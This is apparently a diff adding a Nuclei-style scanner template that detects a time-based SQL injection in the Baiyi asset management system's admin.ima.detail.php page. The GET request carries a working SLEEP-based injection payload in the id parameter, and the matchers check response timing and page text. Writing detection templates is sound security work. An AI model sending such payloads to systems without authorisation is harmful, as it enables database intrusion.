@@ -1,0 +1,24 @@
+id: zgy-admin-detail-sqli
+info:
+  name: Baiyi Asset Management System admin.ima.detail SQL Injection
+  author: onewin
+  severity: high
+  description: |
+    Baiyi Asset Management System admin.ima.detail.php is vulnerable to SQL injection. Exploitation can lead to unauthorized access to the database or potential system compromise.
+  tags: 百易云资产管理运营系统
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wuser/admin.ima.detail.php?id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(3)))OKTO)"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration>=3 && duration<8"
+      - type: word
+        words:
+          - "仪表详细"
